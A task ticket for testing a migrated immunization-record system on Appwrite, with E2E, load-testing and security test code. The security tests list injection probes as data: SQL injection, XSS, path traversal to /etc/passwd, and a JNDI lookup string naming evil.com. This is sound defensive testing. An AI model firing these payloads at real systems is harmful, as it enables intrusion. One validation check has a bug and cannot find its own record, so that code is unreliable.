# INT-AW-02: Comprehensive Testing of Migrated System

## Title
Comprehensive Testing of Migrated System

## Priority
High

## Estimated Time
16-20 hours

## Dependencies
- INT-AW-01: Data migration completed
- All BE-AW tasks completed
- All FE-AW tasks completed

## Description
Conduct comprehensive testing of the entire migrated system to ensure all functionality works correctly with Appwrite backend. This includes end-to-end testing, performance testing, security validation, data integrity verification, and user acceptance testing. The testing will validate that the migrated system meets all requirements and performs as expected in production-like conditions.

The testing phase will identify and resolve any issues before production deployment, ensuring a smooth transition for end users.

## Acceptance Criteria
- [ ] End-to-end testing suite implemented and passing
- [ ] Performance testing completed with acceptable results
- [ ] Security testing and vulnerability assessment passed
- [ ] Data integrity and consistency verified
- [ ] User acceptance testing completed successfully
- [ ] Load testing performed for expected user volumes
- [ ] Offline functionality thoroughly tested
- [ ] Real-time synchronization validated
- [ ] Cross-platform compatibility verified
- [ ] Rollback procedures tested and documented

## Technical Notes

### End-to-End Testing Framework

#### E2E Test Suite Setup
```javascript
// tests/e2e/setup.js
const { Client, Databases, Users } = require('node-appwrite');
const { chromium } = require('playwright');

class E2ETestSetup {
  constructor() {
    this.appwriteClient = new Client()
      .setEndpoint(process.env.TEST_APPWRITE_ENDPOINT)
      .setProject(process.env.TEST_APPWRITE_PROJECT_ID)
      .setKey(process.env.TEST_APPWRITE_API_KEY);

    this.databases = new Databases(this.appwriteClient);
    this.users = new Users(this.appwriteClient);
    this.browser = null;
    this.context = null;
    this.page = null;
  }

  async setup() {
    // Launch browser
    this.browser = await chromium.launch({
      headless: process.env.CI === 'true',
      slowMo: 100
    });

    this.context = await this.browser.newContext({
      viewport: { width: 1280, height: 720 },
      permissions: ['geolocation', 'notifications']
    });

    this.page = await this.context.newPage();

    // Set up test data
    await this.setupTestData();
  }

  async teardown() {
    // Clean up test data
    await this.cleanupTestData();

    // Close browser
    if (this.browser) {
      await this.browser.close();
    }
  }

  async setupTestData() {
    // Create test facility
    this.testFacility = await this.databases.createDocument(
      'immune-me-db',
      'facilities',
      'test-facility-001',
      {
        name: 'Test Health Center',
        type: 'health_center',
        district: 'Test District',
        address: '123 Test Street',
        contactPhone: '+1234567890',
        contactEmail: 'test@facility.com',
        isActive: true
      }
    );

    // Create test vaccines
    this.testVaccines = [];
    const vaccines = [
      { id: 'test-vaccine-001', name: 'Test Vaccine A', description: 'Test vaccine for E2E testing' },
      { id: 'test-vaccine-002', name: 'Test Vaccine B', description: 'Another test vaccine' }
    ];

    for (const vaccine of vaccines) {
      const createdVaccine = await this.databases.createDocument(
        'immune-me-db',
        'vaccines',
        vaccine.id,
        {
          name: vaccine.name,
          description: vaccine.description,
          manufacturer: 'Test Manufacturer',
          dosageForm: 'Injection',
          routeOfAdministration: 'Intramuscular',
          storageRequirements: '2-8°C',
          isActive: true
        }
      );
      this.testVaccines.push(createdVaccine);
    }

    // Create test users
    this.testUsers = [];
    const users = [
      {
        id: 'test-admin-001',
        email: 'admin@test.com',
        name: 'Test Admin',
        role: 'admin'
      },
      {
        id: 'test-healthcare-001',
        email: 'healthcare@test.com',
        name: 'Test Healthcare Worker',
        role: 'healthcare_worker'
      },
      {
        id: 'test-manager-001',
        email: 'manager@test.com',
        name: 'Test Facility Manager',
        role: 'facility_manager'
      }
    ];

    for (const user of users) {
      const createdUser = await this.users.create(
        user.id,
        user.email,
        undefined,
        'TestPassword123!',
        user.name
      );

      await this.users.updatePrefs(user.id, {
        role: user.role,
        facilityId: this.testFacility.$id
      });

      this.testUsers.push(createdUser);
    }

    // Create test patients
    this.testPatients = [];
    const patients = [
      {
        id: 'test-patient-001',
        fullName: 'John Test Patient',
        sex: 'M',
        dateOfBirth: '2020-01-15',
        district: 'Test District'
      },
      {
        id: 'test-patient-002',
        fullName: 'Jane Test Patient',
        sex: 'F',
        dateOfBirth: '2019-06-20',
        district: 'Test District'
      }
    ];

    for (const patient of patients) {
      const createdPatient = await this.databases.createDocument(
        'immune-me-db',
        'patients',
        patient.id,
        {
          ...patient,
          dateOfBirth: new Date(patient.dateOfBirth).toISOString(),
          facilityId: this.testFacility.$id,
          healthWorkerId: this.testUsers[1].$id,
          healthWorkerName: this.testUsers[1].name
        }
      );
      this.testPatients.push(createdPatient);
    }
  }

  async cleanupTestData() {
    try {
      // Delete test data in reverse order
      for (const patient of this.testPatients || []) {
        await this.databases.deleteDocument('immune-me-db', 'patients', patient.$id);
      }

      for (const user of this.testUsers || []) {
        await this.users.delete(user.$id);
      }

      for (const vaccine of this.testVaccines || []) {
        await this.databases.deleteDocument('immune-me-db', 'vaccines', vaccine.$id);
      }

      if (this.testFacility) {
        await this.databases.deleteDocument('immune-me-db', 'facilities', this.testFacility.$id);
      }
    } catch (error) {
      console.error('Error cleaning up test data:', error);
    }
  }

  async loginAs(userType) {
    const user = this.testUsers.find(u => u.prefs.role === userType);
    if (!user) {
      throw new Error(`Test user with role ${userType} not found`);
    }

    await this.page.goto(`${process.env.TEST_FRONTEND_URL}/login`);
    
    await this.page.fill('[data-testid="email-input"]', user.email);
    await this.page.fill('[data-testid="password-input"]', 'TestPassword123!');
    await this.page.click('[data-testid="login-button"]');
    
    // Wait for navigation to dashboard
    await this.page.waitForURL('**/dashboard');
    
    return user;
  }
}

module.exports = E2ETestSetup;
```

#### Patient Management E2E Tests
```javascript
// tests/e2e/patient-management.test.js
const { test, expect } = require('@playwright/test');
const E2ETestSetup = require('./setup');

test.describe('Patient Management', () => {
  let testSetup;

  test.beforeAll(async () => {
    testSetup = new E2ETestSetup();
    await testSetup.setup();
  });

  test.afterAll(async () => {
    await testSetup.teardown();
  });

  test('Healthcare worker can create a new patient', async () => {
    await testSetup.loginAs('healthcare_worker');
    
    // Navigate to patients page
    await testSetup.page.click('[data-testid="nav-patients"]');
    await testSetup.page.waitForURL('**/patients');
    
    // Click add patient button
    await testSetup.page.click('[data-testid="add-patient-button"]');
    await testSetup.page.waitForURL('**/patients/new');
    
    // Fill patient form
    await testSetup.page.fill('[data-testid="patient-name-input"]', 'E2E Test Patient');
    await testSetup.page.selectOption('[data-testid="patient-sex-select"]', 'M');
    await testSetup.page.fill('[data-testid="patient-dob-input"]', '2021-03-15');
    await testSetup.page.fill('[data-testid="patient-district-input"]', 'Test District');
    await testSetup.page.fill('[data-testid="patient-mother-name-input"]', 'Test Mother');
    
    // Submit form
    await testSetup.page.click('[data-testid="save-patient-button"]');
    
    // Verify success message
    await expect(testSetup.page.locator('[data-testid="success-message"]')).toBeVisible();
    
    // Verify patient appears in list
    await testSetup.page.waitForURL('**/patients');
    await expect(testSetup.page.locator('text=E2E Test Patient')).toBeVisible();
  });

  test('Healthcare worker can update patient information', async () => {
    await testSetup.loginAs('healthcare_worker');
    
    // Navigate to patients page
    await testSetup.page.click('[data-testid="nav-patients"]');
    await testSetup.page.waitForURL('**/patients');
    
    // Click on first test patient
    await testSetup.page.click(`[data-testid="patient-card-${testSetup.testPatients[0].$id}"]`);
    
    // Click edit button
    await testSetup.page.click('[data-testid="edit-patient-button"]');
    
    // Update patient information
    await testSetup.page.fill('[data-testid="patient-phone-input"]', '+1234567890');
    await testSetup.page.fill('[data-testid="patient-address-input"]', '456 Updated Street');
    
    // Save changes
    await testSetup.page.click('[data-testid="save-patient-button"]');
    
    // Verify success message
    await expect(testSetup.page.locator('[data-testid="success-message"]')).toBeVisible();
    
    // Verify updated information is displayed
    await expect(testSetup.page.locator('text=+1234567890')).toBeVisible();
    await expect(testSetup.page.locator('text=456 Updated Street')).toBeVisible();
  });

  test('Healthcare worker can record immunization', async () => {
    await testSetup.loginAs('healthcare_worker');
    
    // Navigate to patient details
    await testSetup.page.goto(`${process.env.TEST_FRONTEND_URL}/patients/${testSetup.testPatients[0].$id}`);
    
    // Click add immunization button
    await testSetup.page.click('[data-testid="add-immunization-button"]');
    
    // Fill immunization form
    await testSetup.page.selectOption('[data-testid="vaccine-select"]', testSetup.testVaccines[0].$id);
    await testSetup.page.fill('[data-testid="date-administered-input"]', '2023-01-15');
    await testSetup.page.fill('[data-testid="dose-number-input"]', '1');
    await testSetup.page.fill('[data-testid="batch-number-input"]', 'BATCH001');
    await testSetup.page.selectOption('[data-testid="site-select"]', 'Left arm');
    
    // Submit form
    await testSetup.page.click('[data-testid="save-immunization-button"]');
    
    // Verify success message
    await expect(testSetup.page.locator('[data-testid="success-message"]')).toBeVisible();
    
    // Verify immunization appears in patient's record
    await expect(testSetup.page.locator(`text=${testSetup.testVaccines[0].name}`)).toBeVisible();
    await expect(testSetup.page.locator('text=BATCH001')).toBeVisible();
  });

  test('Search functionality works correctly', async () => {
    await testSetup.loginAs('healthcare_worker');
    
    // Navigate to patients page
    await testSetup.page.click('[data-testid="nav-patients"]');
    await testSetup.page.waitForURL('**/patients');
    
    // Use search functionality
    await testSetup.page.fill('[data-testid="search-input"]', 'John');
    await testSetup.page.press('[data-testid="search-input"]', 'Enter');
    
    // Verify search results
    await expect(testSetup.page.locator('text=John Test Patient')).toBeVisible();
    await expect(testSetup.page.locator('text=Jane Test Patient')).not.toBeVisible();
    
    // Clear search
    await testSetup.page.fill('[data-testid="search-input"]', '');
    await testSetup.page.press('[data-testid="search-input"]', 'Enter');
    
    // Verify all patients are shown again
    await expect(testSetup.page.locator('text=John Test Patient')).toBeVisible();
    await expect(testSetup.page.locator('text=Jane Test Patient')).toBeVisible();
  });
});
```

### Performance Testing

#### Load Testing Script
```javascript
// tests/performance/load-test.js
const { Client, Databases, Users } = require('node-appwrite');
const { performance } = require('perf_hooks');

class LoadTester {
  constructor() {
    this.appwriteClient = new Client()
      .setEndpoint(process.env.TEST_APPWRITE_ENDPOINT)
      .setProject(process.env.TEST_APPWRITE_PROJECT_ID)
      .setKey(process.env.TEST_APPWRITE_API_KEY);

    this.databases = new Databases(this.appwriteClient);
    this.users = new Users(this.appwriteClient);
    
    this.results = {
      patientCreation: [],
      patientRetrieval: [],
      immunizationCreation: [],
      searchOperations: [],
      concurrentUsers: []
    };
  }

  async runLoadTests() {
    console.log('Starting load tests...');
    
    // Test patient creation performance
    await this.testPatientCreationPerformance();
    
    // Test patient retrieval performance
    await this.testPatientRetrievalPerformance();
    
    // Test immunization creation performance
    await this.testImmunizationCreationPerformance();
    
    // Test search performance
    await this.testSearchPerformance();
    
    // Test concurrent user operations
    await this.testConcurrentUsers();
    
    // Generate performance report
    return this.generateReport();
  }

  async testPatientCreationPerformance() {
    console.log('Testing patient creation performance...');
    
    const iterations = 100;
    const times = [];
    
    for (let i = 0; i < iterations; i++) {
      const startTime = performance.now();
      
      try {
        await this.databases.createDocument(
          'immune-me-db',
          'patients',
          `load-test-patient-${i}-${Date.now()}`,
          {
            fullName: `Load Test Patient ${i}`,
            sex: i % 2 === 0 ? 'M' : 'F',
            dateOfBirth: new Date(2020 + (i % 4), (i % 12), (i % 28) + 1).toISOString(),
            district: 'Load Test District',
            facilityId: 'test-facility-001'
          }
        );
        
        const endTime = performance.now();
        times.push(endTime - startTime);
        
      } catch (error) {
        console.error(`Patient creation failed at iteration ${i}:`, error.message);
      }
      
      // Small delay to avoid overwhelming the server
      await this.delay(10);
    }
    
    this.results.patientCreation = {
      iterations,
      averageTime: times.reduce((a, b) => a + b, 0) / times.length,
      minTime: Math.min(...times),
      maxTime: Math.max(...times),
      successRate: (times.length / iterations) * 100
    };
  }

  async testPatientRetrievalPerformance() {
    console.log('Testing patient retrieval performance...');
    
    const iterations = 200;
    const times = [];
    
    for (let i = 0; i < iterations; i++) {
      const startTime = performance.now();
      
      try {
        await this.databases.listDocuments(
          'immune-me-db',
          'patients',
          ['limit(50)', 'offset(' + (i * 10) + ')']
        );
        
        const endTime = performance.now();
        times.push(endTime - startTime);
        
      } catch (error) {
        console.error(`Patient retrieval failed at iteration ${i}:`, error.message);
      }
      
      await this.delay(5);
    }
    
    this.results.patientRetrieval = {
      iterations,
      averageTime: times.reduce((a, b) => a + b, 0) / times.length,
      minTime: Math.min(...times),
      maxTime: Math.max(...times),
      successRate: (times.length / iterations) * 100
    };
  }

  async testImmunizationCreationPerformance() {
    console.log('Testing immunization creation performance...');
    
    const iterations = 50;
    const times = [];
    
    for (let i = 0; i < iterations; i++) {
      const startTime = performance.now();
      
      try {
        await this.databases.createDocument(
          'immune-me-db',
          'immunization_records',
          `load-test-immunization-${i}-${Date.now()}`,
          {
            patientId: 'test-patient-001',
            vaccineId: 'test-vaccine-001',
            facilityId: 'test-facility-001',
            administeredBy: 'test-healthcare-001',
            dateAdministered: new Date().toISOString(),
            doseNumber: (i % 3) + 1,
            batchNumber: `BATCH${i.toString().padStart(3, '0')}`,
            siteOfAdministration: 'Left arm'
          }
        );
        
        const endTime = performance.now();
        times.push(endTime - startTime);
        
      } catch (error) {
        console.error(`Immunization creation failed at iteration ${i}:`, error.message);
      }
      
      await this.delay(20);
    }
    
    this.results.immunizationCreation = {
      iterations,
      averageTime: times.reduce((a, b) => a + b, 0) / times.length,
      minTime: Math.min(...times),
      maxTime: Math.max(...times),
      successRate: (times.length / iterations) * 100
    };
  }

  async testSearchPerformance() {
    console.log('Testing search performance...');
    
    const searchTerms = ['Test', 'Patient', 'John', 'Jane', 'District'];
    const times = [];
    
    for (const term of searchTerms) {
      for (let i = 0; i < 20; i++) {
        const startTime = performance.now();
        
        try {
          await this.databases.listDocuments(
            'immune-me-db',
            'patients',
            [`search("fullName", "${term}")`, 'limit(20)']
          );
          
          const endTime = performance.now();
          times.push(endTime - startTime);
          
        } catch (error) {
          console.error(`Search failed for term "${term}":`, error.message);
        }
        
        await this.delay(10);
      }
    }
    
    this.results.searchOperations = {
      iterations: times.length,
      averageTime: times.reduce((a, b) => a + b, 0) / times.length,
      minTime: Math.min(...times),
      maxTime: Math.max(...times),
      successRate: 100 // Assuming all searches succeed
    };
  }

  async testConcurrentUsers() {
    console.log('Testing concurrent user operations...');
    
    const concurrentUsers = 10;
    const operationsPerUser = 20;
    
    const userPromises = [];
    
    for (let userId = 0; userId < concurrentUsers; userId++) {
      userPromises.push(this.simulateUserOperations(userId, operationsPerUser));
    }
    
    const startTime = performance.now();
    const results = await Promise.allSettled(userPromises);
    const endTime = performance.now();
    
    const successfulUsers = results.filter(r => r.status === 'fulfilled').length;
    
    this.results.concurrentUsers = {
      totalUsers: concurrentUsers,
      successfulUsers,
      totalTime: endTime - startTime,
      operationsPerUser,
      successRate: (successfulUsers / concurrentUsers) * 100
    };
  }

  async simulateUserOperations(userId, operations) {
    const times = [];
    
    for (let i = 0; i < operations; i++) {
      const startTime = performance.now();
      
      try {
        // Simulate typical user operations
        switch (i % 4) {
          case 0:
            // List patients
            await this.databases.listDocuments('immune-me-db', 'patients', ['limit(10)']);
            break;
          case 1:
            // Search patients
            await this.databases.listDocuments('immune-me-db', 'patients', ['search("fullName", "Test")', 'limit(5)']);
            break;
          case 2:
            // Get notifications
            await this.databases.listDocuments('immune-me-db', 'notifications', ['limit(10)']);
            break;
          case 3:
            // List immunizations
            await this.databases.listDocuments('immune-me-db', 'immunization_records', ['limit(10)']);
            break;
        }
        
        const endTime = performance.now();
        times.push(endTime - startTime);
        
      } catch (error) {
        console.error(`User ${userId} operation ${i} failed:`, error.message);
      }
      
      await this.delay(Math.random() * 100); // Random delay between operations
    }
    
    return times;
  }

  generateReport() {
    const report = {
      timestamp: new Date().toISOString(),
      summary: {
        patientCreation: `${this.results.patientCreation.averageTime.toFixed(2)}ms avg`,
        patientRetrieval: `${this.results.patientRetrieval.averageTime.toFixed(2)}ms avg`,
        immunizationCreation: `${this.results.immunizationCreation.averageTime.toFixed(2)}ms avg`,
        searchOperations: `${this.results.searchOperations.averageTime.toFixed(2)}ms avg`,
        concurrentUsers: `${this.results.concurrentUsers.successRate.toFixed(1)}% success rate`
      },
      details: this.results,
      recommendations: this.generateRecommendations()
    };
    
    console.log('\n' + '='.repeat(60));
    console.log('PERFORMANCE TEST RESULTS');
    console.log('='.repeat(60));
    console.log('Patient Creation:', report.summary.patientCreation);
    console.log('Patient Retrieval:', report.summary.patientRetrieval);
    console.log('Immunization Creation:', report.summary.immunizationCreation);
    console.log('Search Operations:', report.summary.searchOperations);
    console.log('Concurrent Users:', report.summary.concurrentUsers);
    console.log('='.repeat(60));
    
    return report;
  }

  generateRecommendations() {
    const recommendations = [];
    
    if (this.results.patientCreation.averageTime > 1000) {
      recommendations.push('Patient creation is slow. Consider optimizing data validation or indexing.');
    }
    
    if (this.results.searchOperations.averageTime > 500) {
      recommendations.push('Search operations are slow. Consider adding more indexes or optimizing search queries.');
    }
    
    if (this.results.concurrentUsers.successRate < 95) {
      recommendations.push('Concurrent user operations have high failure rate. Consider implementing better error handling or rate limiting.');
    }
    
    return recommendations;
  }

  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// Run load tests
async function runLoadTests() {
  const loadTester = new LoadTester();
  const report = await loadTester.runLoadTests();
  
  // Save report
  const fs = require('fs').promises;
  const path = require('path');
  
  const reportPath = path.join(__dirname, 'reports', `load-test-${Date.now()}.json`);
  await fs.mkdir(path.dirname(reportPath), { recursive: true });
  await fs.writeFile(reportPath, JSON.stringify(report, null, 2));
  
  console.log('Load test report saved to:', reportPath);
  
  return report;
}

if (require.main === module) {
  runLoadTests().catch(console.error);
}

module.exports = LoadTester;
```

### Security Testing

#### Security Test Suite
```javascript
// tests/security/security-tests.js
const { Client, Databases, Users } = require('node-appwrite');

class SecurityTester {
  constructor() {
    this.appwriteClient = new Client()
      .setEndpoint(process.env.TEST_APPWRITE_ENDPOINT)
      .setProject(process.env.TEST_APPWRITE_PROJECT_ID)
      .setKey(process.env.TEST_APPWRITE_API_KEY);

    this.databases = new Databases(this.appwriteClient);
    this.users = new Users(this.appwriteClient);
    
    this.vulnerabilities = [];
    this.securityIssues = [];
  }

  async runSecurityTests() {
    console.log('Starting security tests...');
    
    await this.testAuthenticationSecurity();
    await this.testAuthorizationControls();
    await this.testDataValidation();
    await this.testInputSanitization();
    await this.testRateLimiting();
    await this.testDataEncryption();
    
    return this.generateSecurityReport();
  }

  async testAuthenticationSecurity() {
    console.log('Testing authentication security...');
    
    try {
      // Test weak password rejection
      try {
        await this.users.create('test-weak-pwd', 'test@weak.com', undefined, '123', 'Test User');
        this.vulnerabilities.push('Weak passwords are accepted');
      } catch (error) {
        // Expected to fail - good
      }
      
      // Test SQL injection in email field
      try {
        await this.users.create('test-sql', "'; DROP TABLE users; --", undefined, 'StrongPass123!', 'Test User');
        this.vulnerabilities.push('SQL injection possible in email field');
      } catch (error) {
        // Expected to fail - good
      }
      
      // Test session management
      // This would require more complex testing with actual sessions
      
    } catch (error) {
      this.securityIssues.push(`Authentication security test failed: ${error.message}`);
    }
  }

  async testAuthorizationControls() {
    console.log('Testing authorization controls...');
    
    try {
      // Create a limited user client
      const limitedClient = new Client()
        .setEndpoint(process.env.TEST_APPWRITE_ENDPOINT)
        .setProject(process.env.TEST_APPWRITE_PROJECT_ID);
      
      const limitedDatabases = new Databases(limitedClient);
      
      // Test unauthorized access to admin functions
      try {
        await limitedDatabases.listDocuments('immune-me-db', 'users');
        this.vulnerabilities.push('Unauthorized access to user data possible');
      } catch (error) {
        // Expected to fail - good
      }
      
      // Test cross-facility data access
      // This would require setting up test data with different facility IDs
      
    } catch (error) {
      this.securityIssues.push(`Authorization test failed: ${error.message}`);
    }
  }

  async testDataValidation() {
    console.log('Testing data validation...');
    
    const maliciousInputs = [
      '<script>alert("XSS")</script>',
      '../../etc/passwd',
      'null',
      'undefined',
      '${jndi:ldap://evil.com/a}',
      'OR 1=1--',
      '<img src=x onerror=alert(1)>'
    ];
    
    for (const input of maliciousInputs) {
      try {
        await this.databases.createDocument(
          'immune-me-db',
          'patients',
          'test-malicious-' + Date.now(),
          {
            fullName: input,
            sex: 'M',
            dateOfBirth: new Date().toISOString(),
            district: input,
            facilityId: 'test-facility-001'
          }
        );
        
        // If this succeeds, check if the malicious input was sanitized
        const created = await this.databases.getDocument('immune-me-db', 'patients', 'test-malicious-' + Date.now());
        if (created.fullName === input) {
          this.vulnerabilities.push(`Malicious input not sanitized: ${input}`);
        }
        
      } catch (error) {
        // Expected for some inputs
      }
    }
  }

  async testInputSanitization() {
    console.log('Testing input sanitization...');
    
    // Test various injection attempts
    const injectionTests = [
      { field: 'fullName', value: "'; DROP TABLE patients; --" },
      { field: 'district', value: '<script>alert("XSS")</script>' },
      { field: 'address', value: '{{7*7}}' }, // Template injection
      { field: 'contactPhone', value: 'javascript:alert(1)' }
    ];
    
    for (const test of injectionTests) {
      try {
        const testData = {
          fullName: 'Test Patient',
          sex: 'M',
          dateOfBirth: new Date().toISOString(),
          district: 'Test District',
          facil